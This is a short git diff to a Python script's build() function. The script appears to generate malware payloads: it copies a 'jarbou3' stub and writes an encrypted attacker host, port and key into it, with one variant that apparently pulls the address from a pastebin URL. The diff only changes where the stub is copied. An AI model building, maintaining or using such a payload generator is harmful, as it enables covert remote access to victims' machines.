@@ -73,6 +73,7 @@ def checkreqwin():
 
 def build():
     global key
+    current = os.getcwd()
 
     def genkey(length: int) -> bytes:
         return os.urandom(length)
@@ -105,7 +106,8 @@ def build():
         if platform.system() == "Windows":
             os.system('powershell -c cd stub; cp jarbou3.py ..')
         else:
-            os.system("cp -r stub/jarbou3.py ..")
+
+            os.system("cp -r stub/jarbou3.py "+current)
         replace_string('jarbou3.py', '$lhost', str(cryptedhost))
         replace_string('jarbou3.py', '$lport', str(cryptedport))
         replace_string("jarbou3.py", "$hostkey", str(keyhost))
@@ -134,7 +136,7 @@ def build():
         if platform.system() == "Windows":
             os.system('powershell -c cd stub; cp jarbou3-pastebin.py ..')
         else:
-            os.system("cp -r stub/jarbou3-pastebin.py ..")
+            os.system("cp -r stub/jarbou3-pastebin.py "+current)
         ask = input('is  those your host and port(y/n):')
         if ask == 'y':
             replace_string('jarbou3-pastebin.py', '$pastebin', URL)
